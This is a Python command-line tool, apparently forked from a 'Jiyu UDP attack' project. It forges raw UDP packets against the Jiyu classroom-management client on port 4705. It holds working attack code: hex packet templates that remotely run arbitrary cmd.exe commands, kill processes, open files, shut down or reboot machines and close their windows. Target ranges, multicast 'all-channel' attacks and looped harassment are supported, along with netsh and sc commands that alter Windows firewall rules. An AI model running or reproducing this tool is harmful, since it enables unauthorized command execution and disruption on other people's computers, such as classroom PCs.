import socket
import struct
import random
import sys
import os
import getopt
import time

def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+=  (data[i]) + ((data[i+1]) << 8)
    if n:
        s+= (data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s

def format16(str):
      l = []
      for i in range(len(str)):
        if i % 2 ==0:
          q = int('0x' + (str[i:i+2]),16)
          l.append(q)
      return l

class UDP(object):
    def __init__(self, destination,sport,dport,data=''):
        super(UDP, self).__init__()
        self.destination = destination 
        self.data = data 
        self.sport =sport
        self.dport = dport
        self.length = 8+len(data);
        self.checksum =0

    def create_udp_header(self,proto=socket.IPPROTO_UDP):
        pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(socket.gethostbyname(socket.gethostname())), socket.inet_aton(self.destination), 0, proto, self.length)
        self.checksum = checksum(pseudo_header)
        udp_header = struct.pack('!HHHH', self.sport, self.dport, self.length, self.checksum)
        return udp_header
           
    def send(self): 
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        except Exception as e:
            raise e
        data = bytes(self.data)
        udp_header = struct.pack('!HHHH', self.sport, self.dport, self.length, self.checksum)
        packet = udp_header+data
        s.sendto(packet, (self.destination, self.dport));
        s.close()
        print('UDP Send Successful!')


class Data(object):
    
    def __init__(self, data='',mydata='',effect='',nocmd=0,onlyhead=0):
        super(Data, self).__init__()
        self.data = data
        self.effect = effect
        self.nocmd = nocmd
        self.onlyhead =onlyhead
        self.header = {
            #发送消息
            "msg": '444d4f43000001009e0300001041affba0e7524091dc27a3b6f9292e204e0000c0a850819103000091030000000800000000000005000000',
            #执行命令
            "cmd": '444d4f43000001006e030000aa9218a2aa809246b7d5ad545b998dc6204e0000c0a81f0b610300006103000000020000000000000f0000000100000043003a005c00570049004e0044004f00570053005c00730079007300740065006d00330032005c0063006d0064002e00650078006500000000000000',
            #结束进程
            "kill": '444d4f43000001002a020000ff520b222a07974684aeb80ea9c3a15c204e0000c0a8c5011d0200001d0200000002000000000000020000100000000001',
            #结束进程 开始
            "kill_start": '54524d430000010004000000ff520b222a07974684aeb80ea9c3a15cc0a8c581',
            #打开文件
            "open": '444d4f43000001006e0300003593442e858bcc4f9fa7cb5f09c127c0204e0000c0a8c501610300006103000000020000000000000f00000001000000',
            #黑屏
            "blackscreen": '4d4553530100000001000000c0a8c58127000000200000000000008001000000010000000a00000000000000ffffff0000000000a00520',
            #关机
            "reboot": '444d4f43000001002a020000bf40224e572d3e4f9b6fc18de1eb4f62204e0000c0a850811d0200001d0200000002000000000000130000100f00000001000000000000005965085e065ccd912f54a8608476a18b977b3a670230',
            #重启
            "shutdown": '444d4f43000001002a020000c8e397fdc0b59f45877205bd4e46a896204e0000c0a850811d0200001d0200000002000000000000140000100f00000001000000000000005965085e065c7351ed95a8608476a18b977b3a670230',
            #关闭所有窗口
            "caw": '444d4f43000001002a0200003dd66ec35ae75ac81b8bad50c5b0ca73204e0000c0a8019b1d0200001d0200000002000000000000020000100f00000001000000000000005965085e065c7351ed95a8608476945e28750b7a8f5e000000000000',
            #关闭所有窗口 计时
            "caw_time": '444d4f43000001002a02000088b3b065b0be56f920decdd2d8823e35204e0000c0a8019b1d0200001d0200000002000000000000020000000500000001000000',
            #关闭顶端窗口
            "ctw": '444d4f43000001006e0300004e1e91f07b48f68a3cda55563075967a204e0000c0a8019b610300006103000000020000000000000e0000000000000001000000e102020ba615e102020ca9150100112b0000100001000000010000005e010000000000000200000000500000a005000001000000190000004b00000000000000c0a8019b040000000c00000010000000000000002003e001',
            #签到骚扰
            "sih": '444d4f430000010026000000e9a680e905af21c1fb06301637bb65ab204e0000c0a8019b190000001900000000020000000000001b00000001000000030000000000',
            #自定义数据
            "mydata":mydata,
        }
    def pack(self): 
        data = self.pkg_data(self.data)
        payload = struct.pack("%dB" % (len(data)), *data)
        return payload
    
    def format_4byte_send(self,content):
        arr = []
        for ch in content:
            tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
            if int(tmp, 16) > 0xff:
                tmp = tmp[2:]
                high = int((tmp[0] + tmp[1]), 16)
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
            else:
                high = 0
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
        return arr

    def pkg_data(self, content):
        data_header = format16(self.header[self.effect])
        
        if len(data_header)<28:
            data_header = data_header+ [(0x00) for i in range(28-len(data_header))]
        for i in range(16):
            data_header[12+i]=int(random.randint(0,255))
            
        if self.onlyhead==1:
            return data_header
            
        data_data = self.format_4byte_send(self.data)

        if self.nocmd ==1:
            header_fill =[]
        else:
            header_fill = [(0x00) for i in range(572-len(data_header))]

        data_fill = [(0x00) for i in range(1440-len(data_header)-len(header_fill)-len(data_data))]
        data = data_header + header_fill + data_data +data_fill
        
        return data

class CLI(object):
    def __init__(self):
        super(CLI,self).__init__()

    def printUsage(self):
        print ('''
        =======================================================================================
        |      ________     ___         _________     _________    _________      __      __   |
        |     /  _____/    /  /        /  ____   \   /  ______/   /  ______/   __/ /_  __/ /_  |
        |    /  /         /  /        /  /    /  /  /  /______   /  /______   /_  __/ /_  __/  |
        |   /  /         /  /        /  /____/  /  /_____    /  /_____    /    /_/     /_/     |
        |  /  /______   /  /_____   /  _____   /  _______/  /  _______/  /                     |
        | /_________/  /________/  /__/    /__/  /_________/  /_________/                      |
        |                                                                                      |
        |                           Your super computer class helper                           |
        ========================================================================================
          原仓库地址:ht0Ruial/Jiyu_udp_attack && bingyang1/my_jiyu && Qmeimei10086/class-killer
                                            由 arlenWKX 修改                                    
        
        使用方法: 
        

        -h[help]:                           帮助菜单

        --------------------------------------必选参数--------------------------------------
        -i[ip]:                   <ip>      目标IP地址,如10.49.6.1或10.49.6.1-255或10.49.6.1/24
                                            这样的单个/多个ip或整个网段。  
                                            注: 224.50.50.42是组播地址，可用于全频道攻击。

        --------------------------------------功能参数-------------------------------------- 

        [m]essage                 <hello>   要发送的消息。
        [c]ommand                 <cmd>     要执行的命令。
        [r]eboot                            重启目标机器。
        [s]hutdown                          关闭目标机器。
        [k]ill                    <name>    结束进程
        [o]pen                    <name>    打开文件
        [b]lackscreen                       黑屏（不可用）
        caw                                 关闭目标所有程序
        ctw                                 关闭目标顶端窗口
        sih                                 签到骚扰
        [g]etip                             获取本机IP
        stop                                帮极域断网,老师能看到
        start                               恢复极域

        --------------------------------------可选参数--------------------------------------  
        [p]ort                    <port>    接收方端口,默认4705。              
        sport                     <port>    发包端口,默认随机 
        [d]elay                   <sec>     设置循环执行的时间间隔,默认为5秒
        [l]oop                    <times>   设置循环次数,默认为1次
        mydata                    <hex>     独立选项,发送16进制原始数据,与其他功能选项互斥

        ------------------------------------------------------------------------------------
            例:
            Attack.py -i 224.50.50.42-224 -m "Test" 
            Attack.py -i 224.50.50.42/24 -m "Test" -t 3 -l 5
            Attack.py -i 224.50.50.42 -c "for /l %i in (1,1,10) do (@pause)"
            Attack.py -i 224.50.50.42 -k
            Attack.py -i 224.50.50.42 --sih -t 1 -l 200 --echo -m "Ha Ha Ha"
        
        ------------------------------------------------------------------------------------
                                      你的IP地址是:{}
        ------------------------------------------------------------------------------------
        '''.format(socket.gethostbyname(socket.gethostname())))
     
    def main(self):
        if len(sys.argv)< 2 :
            self.printUsage()
            sys.exit(-1)

        config ={
            "ip" : "",
            "port" : 4705,
            "message" : "",
            "command" : "",
            "time":0,
            "loop":1,
            "reboot":0,
            "shutdown":0,
            "kill":"",
            "open":"",
            "blackscreen":0,
            "caw":0,
            "ctw":0,
            "sih":0,
            "sport":random.randint(1, 65535),
            "mydata":""
        }

        arg_full = ["help"]
        arg_abbr = "h"
        for x in config:
            if config [ x ] != 0:
                arg_full.append ( x + "=" )
                if not x[0] in arg_abbr:
                    arg_abbr = arg_abbr + x[0] + ":"
            else:
                arg_full.append ( x )
                if not x[0] in arg_abbr:
                    arg_abbr = arg_abbr + x[0]

        try:
            opts, args = getopt.getopt(sys.argv[1:],arg_abbr, arg_full)
        
        except getopt.GetoptError:
            print("Bad parameter!"+"sys.argv:"+str(sys.argv))
            self.printUsage()
            sys.exit(-1)
        
        for opt,arg in opts:
            if opt in ("-i", "--ip"):
                config["ip"] =arg

            elif opt in ("-p","--port"):
                config["port"] =int(arg)

            elif opt in ("-m","--message"):
                config["message"] =arg

            elif opt in ("-c","--command"):
                config["command"] =arg

            elif opt in ("-k","--kill"):
                config["kill"] =arg

            elif opt in ("-o", "--open"):
                config["open"] =arg

            elif opt in ("-d","--delay"):
                config["time"] =float(arg)

            elif opt in ("-l","--loop"):
                config["loop"] =int(arg)

            elif opt in ("-b", "--blackscreen" ):
                config["blackscreen"] = 1

            elif opt in ("-r","--reboot"):
                config["reboot"] =1

            elif opt in ("-s","--shutdown"):
                config["shutdown"] =1

            elif opt == "--caw":
                config["caw"] =1

            elif opt == "--ctw":
                config["ctw"] =1

            elif opt == "--sih":
                config["sih"] =1

            elif opt in ("-g", "--getip"):
                print('|%-62s|'%(os.popen(r'ifconfig |findstr IPv4').read()))

            elif opt in "--stop":
                os.popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')

            elif opt in "--start":
                os.popen('sc config MpsSvc start= auto')
                os.popen('net start MpsSvc')
                os.popen('netsh advfirewall set allprofiles state on')
                os.popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')

            elif opt == "--sport":
                config["sport"] =int(arg)

            elif opt == "--mydata":
                config["mydata"] =arg

            elif opt in("-h","--help"):
                self.printUsage()
                
        self.send(config)

    def get_iplist(self,ip):
        ip_list = []

        if ip.partition(r'/')[1] =='/':
            ip = ip.partition(r'/')
        elif ip.partition(r'-')[1] =='-':
            ip = ip.partition(r'-')

        if len(ip) > 0:
            if  ip[1] == '/':
                if  int(ip[2])< 33  and int(ip[2]) > 0:
                    bgn = int(ip[0].rpartition(r'.')[2])
                    end = pow(2,(32-int(ip[2])))+1
                    for j in range(bgn,bgn+end):
                        if j < 256:
                            ip_list.append(ip[0].rpartition(r'.')[0]+'.'+str(j))
            elif  ip[1]== '-':
                for i in range(int(ip[0].rpartition(r'.')[2]),int(ip[2])+1):
                    if i < 256:
                        ip_list.append(ip[0].rpartition(r'.')[0]+'.'+str(i))
            else :
                try:
                    socket.inet_aton(ip)
                except socket.error:
                    print('Invalid IP address.Please try again.')
                    return
                else:
                    ip_list.append(ip)
        return ip_list
        

    def send(self,config):
        for count in range(int(config["loop"])):
            for ip in self.get_iplist(config["ip"]):

                print(f'[time {count+1}]')

                payload = {
                    "message": Data(data=config["message"],effect="msg",nocmd=1,onlyhead=0).pack(),
                    "command": Data(data= r"/c "+ config["command"],effect="cmd",nocmd=0,onlyhead=0).pack(),
                    "mydata": Data(mydata=config["mydata"],effect="mydata",nocmd=1,onlyhead=1).pack(),
                    "kill": Data(mydata=config["kill"],effect="kill",nocmd=1,onlyhead=0).pack(),
                    "open": Data(mydata=config["open"],effect="open",nocmd=1,onlyhead=0).pack()
                }
                run = {
                    "caw":Data(data="",effect="caw",nocmd=0,onlyhead=0).pack(),
                    "ctw":Data(data="",effect="ctw",nocmd=0,onlyhead=0).pack(),
                    "sih":Data(data="",effect="sih",nocmd=0,onlyhead=0).pack(),
                    "shutdown":Data(data="",effect="shutdown",nocmd=0,onlyhead=0).pack(),
                    "reboot":Data(data="",effect="reboot",nocmd=0,onlyhead=0).pack(),
                    "blackscreen":Data(data="",effect="blackscreen",nocmd=0,onlyhead=0).pack()
                }
                
                for choice in run:
                    if config[choice]:
                        print("  [%s]===>%-16s"%(choice,ip))
                        try:
                            UDP(ip,config["sport"],config["port"],run[choice]).send()
                        except Exception as e:
                            print(e)

                for choice in payload:
                    if config[choice]!='':
                        print("  [%s]===>%-16s"%(choice,ip))
                        try:
                            UDP(ip,config["sport"],config["port"],payload[choice]).send()
                        except Exception as e:
                            print(e)

            print("Sleep for {} s...".format(config["time"]))
            time.sleep(config["time"])
        
        print("Finish.")                  



if __name__ == '__main__':

    cli = CLI()
    cli.main()